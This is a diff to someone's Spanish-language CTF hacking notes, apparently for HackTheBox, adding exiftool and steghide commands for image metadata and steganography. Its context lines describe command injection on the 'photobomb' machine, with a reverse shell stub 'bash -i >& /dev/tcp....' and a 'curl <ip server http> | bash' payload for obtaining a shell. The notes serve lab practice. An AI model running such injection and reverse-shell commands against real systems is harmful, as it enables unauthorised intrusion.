@@ -1,4 +1,10 @@
 	####Image hacking
+
+----------      ----------      ----------      ----------
+exiftool <nombre imagen>
+#Ver metadatos de la imagen
+
+----------      ----------      ----------      ----------
 maquina: photobomb en HTB
 	###Command injection
 #El reescalado de una imagen en linux puede hacerse con
@@ -8,5 +14,12 @@ En este punto se podrian inyectar comandos para poder recibir una shell.
 Compartiendo mediante un server http nuestra reverse shell (bash -i >& /dev/tcp....) se podria inyectar un curl <ip server http> | bash para obtener una shell
 Tambien se podria descarar y ejecutarlo de forma local en la maquina que estamos atacando
 
+----------      ----------      ----------      ----------
+	###Steganografia
+steghide info <nombre imagen>
+#Ver informacion, si existe, oculta en la imagen.
+#Va a pedir pwd. Probar sin ninguna primero
 
+steghide extract -sf  <nombre imagen>
+#Extraer informacion oculta en la imagen
 
